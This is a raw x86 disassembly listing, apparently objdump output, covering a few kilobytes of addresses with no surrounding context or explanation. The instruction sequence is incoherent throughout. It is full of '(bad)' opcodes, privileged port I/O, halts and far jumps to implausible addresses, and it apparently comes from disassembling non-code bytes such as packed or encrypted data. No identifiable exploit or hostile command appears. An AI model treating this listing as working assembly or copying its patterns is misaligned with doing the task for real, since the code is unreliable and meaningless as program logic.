  414928:	or     eax,0x3df737da
  41492d:	cmp    BYTE PTR [eax],cl
  41492f:	dec    esp
  414930:	leave  
  414931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414932:	cli    
  414933:	inc    edx
  414934:	clc    
  414935:	push   edx
  414936:	mov    edi,0x471410d5
  41493b:	nop
  41493c:	cld    
  41493d:	mov    edx,0xc5c436bd
  414942:	fistp  QWORD PTR [ebx]
  414944:	scas   eax,DWORD PTR es:[edi]
  414945:	dec    edx
  414946:	mov    DWORD PTR [ecx],0xa0ca8a0d
  41494c:	mov    al,0x49
  41494e:	inc    ebp
  41494f:	push   edi
  414950:	and    dh,bl
  414952:	and    eax,0x81b6d119
  414957:	scas   eax,DWORD PTR es:[edi]
  414958:	es (bad) 
  41495a:	mov    ebp,esi
  41495c:	icebp  
  41495d:	cwde   
  41495e:	test   DWORD PTR [edx-0x612af987],0xf8b6a223
  414968:	xor    bl,BYTE PTR ds:0xe18cb80b
  41496e:	pop    esi
  41496f:	adc    DWORD PTR [eax-0x6e],eax
  414972:	mov    edx,0xc6c8ee7b
  414977:	das    
  414978:	xchg   edi,eax
  414979:	stos   BYTE PTR es:[edi],al
  41497a:	int    0x8a
  41497c:	push   esi
  41497d:	call   0x42512ad9
  414982:	add    dl,ch
  414984:	vhaddpd xmm4,xmm7,xmm1
  414988:	xchg   ebx,eax
  414989:	sub    BYTE PTR ds:0xbbf13bfe,cl
  41498f:	cld    
  414990:	sub    ch,BYTE PTR [edi-0x7c307483]
  414996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414997:	cmp    ecx,DWORD PTR [ebx+0x655e0e4]
  41499d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41499e:	in     al,0xb0
  4149a0:	cld    
  4149a1:	fsub   DWORD PTR [ebp+ebx*2-0x5]
  4149a5:	mov    bh,0x6f
  4149a7:	dec    edx
  4149a8:	mov    bl,0x9a
  4149aa:	pop    ebx
  4149ab:	cmp    dh,ah
  4149ad:	lock js 0x41494d
  4149b0:	and    DWORD PTR [edi+eax*4-0x65],ecx
  4149b4:	mov    edx,0x4b160f91
  4149b9:	sub    edx,DWORD PTR [ebx-0x2f]
  4149bc:	sbb    al,0xef
  4149be:	mov    esi,0x9e31fa31
  4149c3:	jp     0x4149f4
  4149c5:	xchg   edx,eax
  4149c6:	xchg   esp,eax
  4149c7:	mov    dh,0xad
  4149c9:	enter  0x787a,0xfb
  4149cd:	push   ebp
  4149ce:	push   ds
  4149cf:	xchg   esi,eax
  4149d0:	out    dx,al
  4149d1:	(bad)  
  4149d2:	and    al,0x8c
  4149d4:	data16 mov al,0x5f
  4149d7:	pop    ecx
  4149d8:	cmp    eax,0x2fcad4de
  4149dd:	cmp    edi,DWORD PTR [edi+0x6038df5a]
  4149e3:	mov    dl,0xd1
  4149e5:	retf   0x7a19
  4149e8:	fwait
  4149e9:	jecxz  0x4149a3
  4149eb:	int    0x97
  4149ed:	jp     0x4149cb
  4149ef:	bound  edi,QWORD PTR [edi+ebp*2+0x3b]
  4149f3:	and    eax,esp
  4149f5:	ret    
  4149f6:	ins    DWORD PTR es:[edi],dx
  4149f7:	jae    0x414a72
  4149f9:	xchg   ecx,eax
  4149fa:	hlt    
  4149fb:	jne    0x4149ab
  4149fd:	xchg   ebx,eax
  4149fe:	mov    edx,0x2d8dbaef
  414a03:	repz adc eax,0xc0635997
  414a09:	pop    ebx
  414a0a:	jmp    0x7daa4db7
  414a0f:	popf   
  414a10:	xchg   esp,eax
  414a11:	jo     0x4149cd
  414a13:	or     eax,0x426713f6
  414a18:	jge    0x414a85
  414a1a:	mov    ds:0x256b7d3,al
  414a1f:	jle    0x4149ce
  414a21:	xchg   BYTE PTR [edx-0x6070f6a7],bl
  414a27:	xchg   esp,eax
  414a28:	iret   
  414a29:	nop
  414a2a:	out    0xe4,eax
  414a2c:	rol    DWORD PTR [edi+ebp*2-0x3],1
  414a30:	das    
  414a31:	or     BYTE PTR [esi],0x7d
  414a34:	imul   esp,DWORD PTR [edi+0x4a],0x4f6fc867
  414a3b:	xor    al,0x49
  414a3d:	sbb    ah,BYTE PTR [eax]
  414a3f:	pop    es
  414a40:	data16 mov ah,0x2
  414a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a44:	push   ebp
  414a45:	sub    eax,0x461373e4
  414a4a:	pop    es
  414a4b:	lds    edx,FWORD PTR [ebx]
  414a4d:	les    ebx,FWORD PTR [edx-0x4b8226a2]
  414a53:	test   DWORD PTR [edx+0x5830005b],esi
  414a59:	scas   al,BYTE PTR es:[edi]
  414a5a:	pop    esp
  414a5b:	leave  
  414a5c:	pop    es
  414a5d:	mov    ebp,0xc701b2f4
  414a62:	enter  0xcb12,0xe5
  414a66:	shr    DWORD PTR [esi+0x24672b63],cl
  414a6c:	ds mov dh,0x52
  414a6f:	icebp  
  414a70:	ret    0x10a6
  414a73:	cmp    al,0xba
  414a75:	shl    BYTE PTR [ebx+0x5],1
  414a78:	stos   DWORD PTR es:[edi],eax
  414a79:	jp     0x414abf
  414a7b:	ret    0xac4a
  414a7e:	cmp    edi,DWORD PTR [ebp+0x64]
  414a81:	or     al,0xc4
  414a83:	dec    ecx
  414a84:	mov    ds,eax
  414a86:	fisub  WORD PTR [ebx+0x12]
  414a89:	add    BYTE PTR [ecx-0x5bbb1a45],ah
  414a8f:	and    ah,ch
  414a91:	ds cwde 
  414a93:	mov    esi,0xe2ba34c1
  414a98:	pop    ebx
  414a99:	clc    
  414a9a:	out    0xd4,eax
  414a9c:	adc    eax,0xd5f2c044
  414aa1:	adc    BYTE PTR [edx],bl
  414aa3:	mov    edi,0xd1138c9f
  414aa8:	repz fsubp st(1),st
  414aab:	adc    BYTE PTR [ebx-0x111f7685],cl
  414ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ab2:	ret    
  414ab3:	cmp    edx,DWORD PTR [ecx-0x37070a36]
  414ab9:	sahf   
  414aba:	call   0xb7c:0x7e10927a
  414ac1:	adc    ch,bh
  414ac3:	lahf   
  414ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ac5:	pop    ss
  414ac6:	dec    edi
  414ac7:	pushw  es
  414ac9:	sbb    al,0x48
  414acb:	add    bh,BYTE PTR [esi-0x2a]
  414ace:	dec    edi
  414acf:	imul   edx,DWORD PTR [esi+0xb559c76],0xd7171a22
  414ad9:	repnz sub DWORD PTR [eax-0x3f4176ed],edi
  414ae0:	out    0x3a,eax
  414ae2:	js     0x414a90
  414ae4:	call   0xffddd300
  414ae9:	aad    0x91
  414aeb:	aaa    
  414aec:	and    DWORD PTR [edi],esp
  414aee:	and    eax,ebp
  414af0:	and    edi,0x8ff65678
  414af6:	jmp    FWORD PTR ds:0x9da2c5b7
  414afc:	(bad)
  414b00:	std    
  414b01:	test   BYTE PTR [ecx+0xb],ch
  414b04:	and    DWORD PTR [esi],eax
  414b06:	(bad)  
  414b07:	mov    BYTE PTR [ebp-0x2f],al
  414b0a:	sbb    DWORD PTR [ecx+0x4e423273],0xcefbc231
  414b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b15:	in     eax,0x69
  414b17:	xchg   ecx,eax
  414b18:	push   edi
  414b19:	and    DWORD PTR [esi],esi
  414b1b:	lea    ebx,[ebx+0x28]
  414b1e:	push   es
  414b1f:	jl     0x414ad4
  414b21:	cmp    ecx,DWORD PTR [eax-0x6f]
  414b24:	xlat   BYTE PTR ds:[ebx]
  414b25:	mov    esi,DWORD PTR [ebp-0xf]
  414b28:	sub    BYTE PTR [edi-0x3d],0xbe
  414b2c:	test   eax,0x4116d154
  414b31:	out    dx,al
  414b32:	add    eax,eax
  414b34:	xor    al,0xc7
  414b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b37:	xor    ecx,DWORD PTR [ebx+0x1f31ee09]
  414b3d:	int3   
  414b3e:	push   ds
  414b3f:	icebp  
  414b40:	jge    0x414b31
  414b42:	mov    bl,0xfd
  414b44:	dec    ebp
  414b45:	mov    ch,0x29
  414b47:	ss retf 
  414b49:	imul   eax,edi,0x6245598
  414b4f:	pop    ds
  414b50:	lea    esi,[edx-0x604f6648]
  414b56:	mov    edx,0xaa75fa69
  414b5b:	arpl   WORD PTR [ebx+0x2f],ax
  414b5e:	fsubr  DWORD PTR [edi+0x287fca80]
  414b64:	pop    ecx
  414b65:	call   0x616d7c2e
  414b6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b6b:	pop    edx
  414b6c:	fimul  DWORD PTR [edx]
  414b6e:	cwde   
  414b6f:	add    BYTE PTR [ebx+0x5a],0x53
  414b73:	(bad)  
  414b74:	and    bh,ch
  414b76:	jbe    0x414bcc
  414b78:	dec    eax
  414b79:	pop    esp
  414b7a:	and    DWORD PTR [ecx+0x58],ecx
  414b7d:	icebp  
  414b7e:	jl     0x414bdb
  414b80:	push   es
  414b81:	sub    DWORD PTR [esp+0x49],0xc
  414b86:	mul    ebx
  414b88:	mov    ds:0x770029de,al
  414b8d:	fild   DWORD PTR [edi-0x3e]
  414b90:	push   ebx
  414b91:	fmul   QWORD PTR [ebp+edi*8+0x28]
  414b95:	mov    edx,0x84b5b7c4
  414b9a:	repnz pop eax
  414b9c:	in     eax,dx
  414b9d:	push   ds
  414b9e:	jmp    0x4b936c63
  414ba3:	inc    ecx
  414ba4:	or     al,0x1a
  414ba6:	mov    ecx,0xaa55f1f5
  414bab:	sbb    eax,0x37286c4f
  414bb0:	jns    0x414b91
  414bb2:	jnp    0x414bfd
  414bb4:	dec    ebp
  414bb5:	(bad)  
  414bb6:	mov    DWORD PTR [ecx+0x6570b751],ebp
  414bbc:	leave  
  414bbd:	inc    ebx
  414bbe:	cmp    esp,DWORD PTR [edx]
  414bc0:	ret    0x1c23
  414bc3:	or     DWORD PTR [edx],0xffffffc0
  414bc6:	sbb    DWORD PTR [esi],edi
  414bc8:	das    
  414bc9:	in     al,0xbd
  414bcb:	xchg   BYTE PTR [esi+0x2d],bl
  414bce:	sub    al,BYTE PTR [ecx]
  414bd0:	mov    edx,0x8a8ca5ee
  414bd5:	or     dh,BYTE PTR [ebx-0x59]
  414bd8:	ss pop edx
  414bda:	mov    edi,DWORD PTR [ecx+0x14]
  414bdd:	bound  ebx,QWORD PTR [esi]
  414bdf:	shl    BYTE PTR [edx-0x3a],1
  414be2:	jae    0x414c0b
  414be4:	std    
  414be5:	ret    0xfea5
  414be8:	mov    eax,ds:0x396d7c6f
  414bed:	int3   
  414bee:	pop    ss
  414bef:	(bad)  
  414bf0:	rol    BYTE PTR [ebp+0x4b],cl
  414bf3:	mov    ebp,0x868f4be4
  414bf8:	test   eax,0x1def4cfc
  414bfd:	les    esi,FWORD PTR [eax-0x7f8adfde]
  414c03:	lds    edx,FWORD PTR [ebx]
  414c05:	(bad)  
  414c06:	mov    ds:0x1e9d1c01,al
  414c0b:	dec    edx
  414c0c:	mov    eax,0x713f748c
  414c11:	adc    esi,DWORD PTR [ecx-0x49d9e49f]
  414c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c18:	dec    ebp
  414c19:	cmp    DWORD PTR [eax-0x7f],0x7c
  414c1d:	inc    esi
  414c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c1f:	and    ch,dh
  414c21:	push   cs
  414c22:	int3   
  414c23:	enter  0x5e39,0x73
  414c27:	ins    DWORD PTR es:[edi],dx
  414c28:	cmp    al,0xaf
  414c2a:	rcr    DWORD PTR [ebx-0x33],0xb
  414c2e:	mov    ah,0x82
  414c30:	out    0x60,al
  414c32:	mov    dl,0x88
  414c34:	shl    DWORD PTR [ebx],0x60
  414c37:	fs xor al,0x80
  414c3a:	lahf   
  414c3b:	aaa    
  414c3c:	shr    DWORD PTR [ebx+0x23],0xec
  414c40:	jecxz  0x414bfe
  414c42:	out    0x54,eax
  414c44:	pusha  
  414c45:	adc    bl,bl
  414c47:	clc    
  414c48:	ja     0x414c50
  414c4a:	mov    bh,0xcb
  414c4c:	test   eax,0x8551483e
  414c51:	fs cld 
  414c53:	cmp    esp,DWORD PTR [eax-0x12]
  414c56:	xor    eax,0x3835f941
  414c5b:	sub    al,0xc0
  414c5d:	adc    DWORD PTR [ebx+0xb],ecx
  414c60:	mov    esp,0xf3ac0fa7
  414c65:	cli    
  414c66:	jge    0x414c96
  414c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c69:	push   eax
  414c6a:	pop    esi
  414c6b:	sbb    esi,0x4c
  414c6e:	mov    edi,0x1fca7104
  414c73:	mov    DWORD PTR [ebx+eiz*1+0x42],0x473e79ae
  414c7b:	push   cs
  414c7c:	leave  
  414c7d:	push   es
  414c7e:	fs cmc 
  414c80:	mov    ch,0x69
  414c82:	or     eax,0x1908c57
  414c87:	ins    BYTE PTR es:[edi],dx
  414c88:	jns    0x414cfd
  414c8a:	or     al,0x53
  414c8c:	xor    DWORD PTR [esi],eax
  414c8e:	jg     0x414c54
  414c90:	mov    BYTE PTR [ebp-0x76a81c24],al
  414c96:	loopne 0x414c9a
  414c98:	pop    ebx
  414c99:	fidivr DWORD PTR [eax-0x11]
  414c9c:	loopne 0x414c46
  414c9e:	test   eax,0xe8cde73c
  414ca3:	push   cs
  414ca4:	add    ch,dl
  414ca6:	ins    BYTE PTR es:[edi],dx
  414ca7:	jnp    0x414cc3
  414ca9:	mov    edx,0x9458e004
  414cae:	jae    0x414c3d
  414cb0:	arpl   WORD PTR [edi+ebp*4],bp
  414cb3:	and    eax,DWORD PTR [esi+0x4755519c]
  414cb9:	adc    BYTE PTR [esi],dh
  414cbb:	in     eax,0xd8
  414cbd:	mov    ebx,0x94114aa0
  414cc2:	add    eax,0x9e158a1
  414cc7:	xor    DWORD PTR [eax+0x4e8a801a],ebx
  414ccd:	push   0xffffff82
  414ccf:	in     al,dx
  414cd0:	sub    dh,0x46
  414cd3:	cmp    al,0x1d
  414cd5:	in     eax,dx
  414cd6:	daa    
  414cd7:	out    0x2c,al
  414cd9:	or     ecx,DWORD PTR [esp+ebx*4+0xe]
  414cdd:	sub    DWORD PTR [esi-0x51],ecx
  414ce0:	out    0x73,eax
  414ce2:	in     eax,0x6d
  414ce4:	loop   0x414d28
  414ce6:	lods   al,BYTE PTR ds:[esi]
  414ce7:	imul   ecx,DWORD PTR [ecx+0x253ea9],0xffffffbc
  414cee:	data16 adc al,0x11
  414cf1:	jmp    0x5219:0x47ea31c0
  414cf8:	sub    DWORD PTR [edi+0x7f],ebp
  414cfb:	and    BYTE PTR [ebp-0x43],ah
  414cfe:	jmp    0x414cb5
  414d00:	loop   0x414ca5
  414d02:	sub    DWORD PTR [edi-0x3c],ebx
  414d05:	scas   eax,DWORD PTR es:[edi]
  414d06:	adc    al,0x60
  414d08:	dec    ecx
  414d09:	cmova  ebx,DWORD PTR [ebx]
  414d0c:	jno    0x414d14
  414d0e:	xchg   DWORD PTR ds:0x40ef52eb,eax
  414d14:	nop
  414d15:	fstp   DWORD PTR [ecx+0x156ac1a6]
  414d1b:	sbb    BYTE PTR ss:[edx+0x49],bl
  414d1f:	mov    edi,0x27e653ec
  414d24:	push   ss
  414d25:	in     al,0xf8
  414d27:	icebp  
  414d28:	jp     0x414cd4
  414d2a:	xor    bh,dl
  414d2c:	sbb    DWORD PTR [edi-0x2f22c4f],ecx
  414d32:	cwde   
  414d33:	push   edi
  414d34:	aaa    
  414d35:	fs jne 0x414cc7
  414d38:	mov    bh,0xa0
  414d3a:	lea    edx,[eax]
  414d3c:	add    DWORD PTR [edi+0x6aa17bdf],eax
  414d42:	lea    ebp,[edi-0x4909c77a]
  414d48:	sub    ecx,edx
  414d4a:	dec    edi
  414d4b:	adc    al,0x85
  414d4d:	call   0x34cba251
  414d52:	mov    ebp,0x160ba3ff
  414d57:	cmp    al,0x13
  414d59:	and    eax,0x3c099ad1
  414d5e:	mov    dl,0x55
  414d60:	or     al,0x74
  414d62:	jbe    0x414d88
  414d64:	fwait
  414d65:	pushf  
  414d66:	test   BYTE PTR [ecx-0x7c6832a5],bl
  414d6c:	pushf  
  414d6d:	lock xchg edi,eax
  414d6f:	mov    ebp,eax
  414d71:	jecxz  0x414d87
  414d73:	push   edi
  414d74:	imul   BYTE PTR [edi+0x70]
  414d77:	loop   0x414d41
  414d79:	cmp    DWORD PTR [ecx],ebx
  414d7b:	ds fs shl ecx,0xa
  414d80:	retf   0xd9b8
  414d83:	clc    
  414d84:	add    al,0x82
  414d86:	inc    edi
  414d87:	cmc    
  414d88:	or     al,0xaf
  414d8a:	push   ecx
  414d8b:	pusha  
  414d8c:	enter  0x7e24,0x42
  414d90:	shl    BYTE PTR [ecx],cl
  414d92:	pop    ecx
  414d93:	sbb    DWORD PTR [ecx-0x47],edi
  414d96:	mov    DWORD PTR ds:0x5956bf33,ebx
  414d9c:	iret   
  414d9d:	sub    DWORD PTR [eax+0x6],ebp
  414da0:	cli    
  414da1:	mov    bh,0x7f
  414da3:	cmp    dh,BYTE PTR [esi+eiz*2]
  414da6:	mul    BYTE PTR [esi-0x16531991]
  414dac:	outs   dx,DWORD PTR ds:[esi]
  414dad:	into   
  414dae:	lahf   
  414daf:	and    ecx,ebp
  414db1:	into   
  414db2:	std    
  414db3:	das    
  414db4:	(bad)  
  414db5:	adc    DWORD PTR [eax-0x5],edx
  414db8:	lahf   
  414db9:	push   es
  414dba:	dec    ebp
  414dbb:	xlat   BYTE PTR ds:[ebx]
  414dbc:	mov    ds:0x7ba8613,al
  414dc1:	adc    ch,BYTE PTR [ecx+0xb5fea33]
  414dc7:	lods   al,BYTE PTR ds:[esi]
  414dc8:	inc    esp
  414dc9:	cmp    al,0x36
  414dcb:	lods   al,BYTE PTR ds:[esi]
  414dcc:	add    eax,0xbe8e441f
  414dd1:	sub    ah,dl
  414dd3:	xchg   esi,eax
  414dd4:	mov    ds:0x966f9611,al
  414dd9:	and    al,0x36
  414ddb:	ret    
  414ddc:	fldcw  WORD PTR [edx]
  414dde:	adc    ch,0x7e
  414de1:	adc    DWORD PTR [ebx-0x80],0xcc72842a
  414de8:	push   ebp
  414de9:	test   eax,0x5133e2ed
  414dee:	retf   
  414def:	in     al,0x44
  414df1:	scas   eax,DWORD PTR es:[edi]
  414df2:	push   edx
  414df3:	jmp    0x414e34
  414df5:	sub    DWORD PTR [eax-0x787b89f],ebp
  414dfb:	pop    esp
  414dfc:	jae    0x414db4
  414dfe:	mov    edi,0xd2220dfb
  414e03:	into   
  414e04:	hlt    
  414e05:	xchg   edx,eax
  414e06:	mov    DWORD PTR [esp+edi*4-0x5eb77907],esp
  414e0d:	jge    0x414e54
  414e0f:	jmp    0xcbcb:0x4d0d2d13
  414e16:	pop    esp
  414e17:	cmp    eax,0x82e0328f
  414e1c:	fpatan 
  414e1e:	test   DWORD PTR [ebx+0xae52cc4],eax
  414e24:	inc    edi
  414e25:	(bad)  
  414e26:	mov    ecx,0x28789310
  414e2b:	icebp  
  414e2c:	repnz fild QWORD PTR [edi-0x6c]
  414e30:	loope  0x414ea4
  414e32:	ret    
  414e33:	fldenv [esi+0x59ba3b5e]
  414e39:	mov    ds:0xa9808e55,al
  414e3e:	add    DWORD PTR [ecx+eiz*4-0xbe30be8],ebp
  414e45:	es mov es,ebx
  414e48:	jg     0x414e6c
  414e4a:	into   
  414e4b:	xchg   esi,eax
  414e4c:	sbb    BYTE PTR [edi+0x1e9a79b5],ah
  414e52:	cli    
  414e53:	mov    bl,0xf8
  414e55:	loopne 0x414eae
  414e57:	push   ebp
  414e58:	popf   
  414e59:	adc    eax,0x1674bff
  414e5e:	cmp    ch,dh
  414e60:	nop
  414e61:	mov    eax,0x6d9d3de
  414e66:	imul   ebp,DWORD PTR [edx-0x31386aad],0x5c03c30a
  414e70:	fs fwait
  414e72:	cdq    
  414e73:	pop    esp
  414e74:	les    esi,FWORD PTR [eax-0x6dc54c32]
  414e7a:	retf   
  414e7b:	mov    eax,0xe60add52
  414e80:	int3   
  414e81:	push   es
  414e82:	sbb    al,BYTE PTR [esi-0x61790273]
  414e88:	cdq    
  414e89:	ins    BYTE PTR es:[edi],dx
  414e8a:	sbb    esi,DWORD PTR [edx]
  414e8c:	adc    bh,BYTE PTR [eax]
  414e8e:	data16 cmp BYTE PTR [eax+esi*4+0x25d69d45],dl
  414e96:	(bad)  
  414e97:	xchg   esi,eax
  414e98:	bound  esp,QWORD PTR [eax-0x55c981b4]
  414e9e:	xlat   BYTE PTR ds:[ebx]
  414e9f:	js     0x414e22
  414ea1:	mov    esp,0xef4661e0
  414ea6:	mov    dl,0xe9
  414ea8:	sub    BYTE PTR [ebx],0xdc
  414eab:	(bad)  
  414ead:	out    dx,eax
  414eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eaf:	xchg   esi,eax
  414eb0:	xchg   ecx,eax
  414eb1:	inc    esp
  414eb2:	xor    al,0x25
  414eb4:	or     al,0x13
  414eb6:	fild   DWORD PTR [ebx]
  414eb8:	xchg   ebp,eax
  414eb9:	loopne 0x414e95
  414ebb:	sub    al,0xff
  414ebd:	daa    
  414ebe:	fbstp  TBYTE PTR [edi+edx*2-0x15c54bdc]
  414ec5:	lods   al,BYTE PTR ds:[esi]
  414ec6:	arpl   WORD PTR [ecx],ax
  414ec8:	pop    ebx
  414ec9:	pop    ebp
  414eca:	add    eax,0x29116bf2
  414ecf:	jbe    0x414e91
  414ed1:	and    DWORD PTR [edx],edx
  414ed3:	sti    
  414ed4:	or     al,0x3a
  414ed6:	jg     0x414ed7
  414ed8:	jp     0x414eb0
  414eda:	jle    0x414f3e
  414edc:	add    BYTE PTR cs:[eax-0xb963f63],ah
  414ee3:	jmp    DWORD PTR [ebp-0x57]
  414ee6:	dec    ebp
  414ee7:	jl     0x414e69
  414ee9:	stc    
  414eea:	mov    ?,WORD PTR [ebx]
  414eec:	stos   BYTE PTR es:[edi],al
  414eed:	sub    DWORD PTR [ecx+eax*4],edi
  414ef0:	inc    ecx
  414ef1:	repnz adc DWORD PTR [ebp-0x59c98e1],0xffffffea
  414ef9:	rcr    DWORD PTR ds:0x458236af,cl
  414eff:	mov    ebx,0xabddc3ea
  414f04:	mov    WORD PTR [edx+ebx*8],es
  414f07:	pop    es
  414f08:	sub    eax,0xaff1310
  414f0d:	adc    eax,DWORD PTR [ebx-0x15114acd]
  414f13:	imul   ebx,DWORD PTR [esi+0x57cb70d7],0x28
  414f1a:	mov    esp,DWORD PTR [ebp-0x67]
  414f1d:	sbb    eax,0xf30b5dfd
  414f22:	jmp    0x7212e875
  414f27:	stc    
  414f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f29:	dec    edi
  414f2a:	inc    esi
  414f2b:	shr    BYTE PTR [edi+0x37],cl
  414f2e:	fdivr  DWORD PTR [ecx+0x21]
  414f31:	jmp    0x414f55
  414f33:	xchg   DWORD PTR [eax+0x55],ebx
  414f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f37:	shl    BYTE PTR [eax-0x11],1
  414f3a:	cmp    BYTE PTR [esi+0x3c827d12],0x1d
  414f41:	or     DWORD PTR ds:0x6a4a310d,ebx
  414f47:	fcomip st,st(4)
  414f49:	mov    DWORD PTR [esi-0x261c1902],esi
  414f4f:	rcl    DWORD PTR [eax+eax*2+0x3590de3e],cl
  414f56:	int    0x81
  414f58:	stos   DWORD PTR es:[edi],eax
  414f59:	xchg   edx,eax
  414f5a:	sbb    ecx,DWORD PTR [edx+0x5d6aabc4]
  414f60:	gs stc 
  414f62:	idiv   DWORD PTR [ecx+0x5]
  414f65:	jg     0x414f09
  414f67:	enter  0xf369,0xd7
  414f6b:	jge    0x414fb9
  414f6d:	xor    bh,bh
  414f6f:	mov    ch,0x4d
  414f71:	repz (bad) [ebp-0x3a08306]
  414f78:	push   esp
  414f79:	xchg   esi,eax
  414f7a:	sbb    DWORD PTR [esi-0x3f],eax
  414f7d:	test   eax,0x43910b56
  414f82:	mov    cl,0xf7
  414f84:	dec    ebx
  414f85:	xchg   edi,eax
  414f86:	data16 or bl,BYTE PTR [ecx-0xb3dca6b]
  414f8d:	adc    DWORD PTR [edx+edi*1+0x1e53590b],eax
  414f94:	aam    0x6a
  414f96:	pop    edx
  414f97:	and    BYTE PTR [edi-0x3e],0x8
  414f9b:	add    ch,al
  414f9d:	mov    ds:0x769df2ab,al
  414fa2:	jg     0x414f47
  414fa4:	mov    cl,0x4d
  414fa6:	pop    ebp
  414fa7:	sub    DWORD PTR [edx],eax
  414fa9:	std    
  414faa:	xor    BYTE PTR [eax],dl
  414fac:	lock jno 0x415010
  414faf:	mov    bl,BYTE PTR ds:0x26b5f1b5
  414fb5:	les    eax,FWORD PTR [ebp+ecx*1-0x68]
  414fb9:	clc    
  414fba:	cmp    eax,0xafc67367
  414fbf:	test   DWORD PTR [edx-0x46],eax
  414fc2:	int    0x12
  414fc4:	pop    eax
  414fc5:	ins    BYTE PTR es:[edi],dx
  414fc6:	mov    dl,0xb8
  414fc8:	pushf  
  414fc9:	jno    0x414f59
  414fcb:	repnz (bad) 
  414fcd:	ins    DWORD PTR es:[edi],dx
  414fce:	mov    DWORD PTR [ebx+eiz*4-0x33],ebp
  414fd2:	(bad)  
  414fd3:	adc    al,0x5
  414fd5:	arpl   WORD PTR [ecx+0x6e],si
  414fd8:	jo     0x415023
  414fda:	pop    ebx
  414fdb:	cmp    eax,0xbf28dc91
  414fe0:	inc    edx
  414fe1:	fidiv  WORD PTR [ecx+0x1d]
  414fe4:	xchg   edi,eax
  414fe5:	fsub   DWORD PTR [ebp-0x3]
  414fe8:	or     BYTE PTR [esi-0x7d],bl
  414feb:	mov    dh,0x59
  414fed:	push   esp
  414fee:	jbe    0x415054
  414ff0:	cmp    dh,BYTE PTR [ebx-0x78]
  414ff3:	sbb    eax,DWORD PTR [ebx]
  414ff5:	and    BYTE PTR [edx],al
  414ff7:	call   0x60ecdba3
  414ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ffd:	adc    al,0x59
  414fff:	mov    cs,WORD PTR [ecx]
  415001:	pop    eax
  415002:	push   ds
  415003:	jl     0x414fda
  415005:	jb     0x414fbc
  415007:	pop    eax
  415008:	pop    es
  415009:	stos   BYTE PTR es:[edi],al
  41500a:	ds das 
  41500c:	jmp    0x36454dc2
  415011:	cmp    ah,al
  415013:	inc    ebx
  415014:	mov    bh,0xee
  415016:	fst    st(2)
  415018:	in     al,0xf5
  41501a:	aaa    
  41501b:	mov    ds:0xb6207962,al
  415020:	cmp    ah,cl
  415022:	push   eax
  415023:	out    0x9,al
  415025:	cmp    ebp,DWORD PTR [eax-0xebe0dbd]
  41502b:	out    0x77,al
  41502d:	nop
  41502e:	mov    BYTE PTR [ecx],dl
  415030:	xchg   ebp,eax
  415031:	pop    ebp
  415032:	xchg   DWORD PTR [edx],ebp
  415034:	es in  eax,0xee
  415037:	pop    edi
  415038:	and    eax,0x3eebe536
  41503d:	mov    bh,0x14
  41503f:	sti    
  415040:	rcl    DWORD PTR [esi+0x3da7c853],cl
  415046:	or     al,0xf6
  415048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415049:	push   ds
  41504a:	pop    eax
  41504b:	push   0xd88c445b
  415050:	imul   edx,DWORD PTR [esi],0xd9ad441d
  415056:	inc    eax
  415057:	xchg   DWORD PTR [ebp+0x11ae8cae],eax
  41505d:	bound  eax,QWORD PTR [edi]
  41505f:	fsub   QWORD PTR [edi+0x3f]
  415062:	or     al,0x61
  415064:	lea    edi,[esi+0x25c7b4eb]
  41506a:	and    BYTE PTR [edx+0xd],bl
  41506d:	inc    eax
  41506e:	imul   esi,DWORD PTR [ebx-0x267f22b9],0x36
  415075:	icebp  
  415076:	lahf   
  415077:	xlat   BYTE PTR ds:[ebx]
  415078:	and    eax,0x6ef296ce
  41507d:	or     DWORD PTR [ebx],ecx
  41507f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415080:	xor    dl,ah
  415082:	mov    ebx,0x6fe7acca
  415087:	dec    esi
  415088:	out    0x53,eax
  41508a:	add    bh,ah
  41508c:	xor    eax,0x1cbff320
  415091:	repz pusha 
  415093:	mov    dh,0x3
  415095:	xchg   BYTE PTR [ebx-0x30c29563],dh
  41509b:	cmp    ebp,DWORD PTR [ecx+0x5a684189]
  4150a1:	test   DWORD PTR [ebx],ebp
  4150a3:	pop    esi
  4150a4:	and    eax,0xfe01f925
  4150a9:	sub    ebx,esp
  4150ab:	retf   0xf14b
  4150ae:	retf   
  4150af:	call   0xf6bfa208
  4150b4:	and    al,0x9d
  4150b6:	lods   al,BYTE PTR ds:[esi]
  4150b7:	and    BYTE PTR [ecx-0x219b0925],cl
  4150bd:	aaa    
  4150be:	(bad)  
  4150bf:	arpl   WORD PTR ds:0x8bc3d19d,dx
  4150c5:	mov    ebp,0xfcd95914
  4150ca:	jbe    0x41514a
  4150cc:	js     0x4150e8
  4150ce:	loope  0x4150b3
  4150d0:	pop    edi
  4150d1:	hlt    
  4150d2:	jne    0x415100
  4150d4:	jne    0x4150f5
  4150d6:	retf   0x7cc3
  4150d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150da:	dec    ebp
  4150db:	or     bl,bh
  4150dd:	clc    
  4150de:	sti    
  4150df:	cld    
  4150e0:	rcl    BYTE PTR [ebx],cl
  4150e2:	jnp    0x4150d1
  4150e4:	loope  0x4150fd
  4150e6:	sbb    DWORD PTR fs:[edx-0x74624d0a],ebx
  4150ed:	lea    edi,ds:0x3212e1a6
  4150f3:	iret   
  4150f4:	mov    BYTE PTR [esi],bh
  4150f6:	mov    dh,0xa3
  4150f8:	inc    ecx
